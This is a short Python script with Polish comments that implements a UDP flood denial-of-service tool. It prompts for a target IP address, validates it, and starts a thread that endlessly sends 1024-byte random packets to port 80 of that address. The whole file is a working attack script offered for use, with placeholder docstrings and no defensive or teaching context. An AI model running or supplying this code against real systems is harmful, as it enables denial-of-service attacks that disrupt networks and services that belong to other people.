"""
TBD
"""
import socket
import random
import threading
import ipaddress
import logging


# Funkcja do wysyłania pakietów do określonego adresu IP
def ddos(target_ip):
    """
    TBD
    """
    while True:
        try:
            # Tworzenie gniazda
            socket_test = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Generowanie losowej zawartości pakietu
            payload = random._urandom(1024)  # pylint: disable=W0212
            # Wysyłanie pakietu na określony adres IP
            socket_test.sendto(payload, (target_ip, 80))
            # Zamykanie gniazda
            socket_test.close()
        except socket.error:
            pass


# Funkcja główna
def ddos_execute(prompts):
    """
    TBD
    """

    target_ip = input(prompts['address_wifi_input'])
    check_flag = False
    try:
        ipaddress.ip_address(target_ip)
        check_flag = True
    except ValueError as error:
        logging.error(error)

    if check_flag:
        # Tworzenie wielu wątków, które będą symulować atak
        for _ in range(1):
            # Tworzenie wątku dla każdego atakującego
            thread = threading.Thread(target=ddos, args=(target_ip,))
            # Uruchamianie wątku
            thread.start()
